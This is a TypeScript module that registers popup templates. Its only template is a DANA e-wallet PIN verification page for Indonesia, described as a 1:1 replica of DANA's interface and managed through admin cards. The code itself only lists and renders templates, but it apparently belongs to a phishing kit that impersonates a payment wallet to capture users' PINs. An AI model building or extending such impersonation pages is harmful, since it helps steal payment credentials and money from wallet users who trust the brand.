import { renderDanaPinPopup } from "./dana-pin.js";

export type PopupTemplateId = "dana-pin-id";

export interface PopupTemplateDefinition {
  id: PopupTemplateId;
  name: string;
  description: string;
  locale: string;
  brand: string;
  category: "payment" | "verification" | "other";
  /** Short label shown in admin cards */
  previewHint: string;
  render: () => string;
}

export const POPUP_TEMPLATES: PopupTemplateDefinition[] = [
  {
    id: "dana-pin-id",
    name: "DANA — PIN Verifikasi (Indonesia)",
    description: "印尼 DANA 钱包 PIN 验证页，1:1 还原 Proses Verifikasi 界面",
    locale: "id-ID",
    brand: "DANA",
    category: "verification",
    previewHint: "Masukkan kode PIN · LUPA PIN?",
    render: () => renderDanaPinPopup(),
  },
];

export function listPopupTemplates() {
  return POPUP_TEMPLATES.map((item) => ({
    id: item.id,
    name: item.name,
    description: item.description,
    locale: item.locale,
    brand: item.brand,
    category: item.category,
    previewHint: item.previewHint,
  }));
}

export function getPopupTemplate(id: string): PopupTemplateDefinition | undefined {
  return POPUP_TEMPLATES.find((item) => item.id === id);
}

export function isPopupTemplateId(id: string): id is PopupTemplateId {
  return POPUP_TEMPLATES.some((item) => item.id === id);
}

export function renderPopupTemplate(id: string): string | null {
  const template = getPopupTemplate(id);
  return template ? template.render() : null;
}
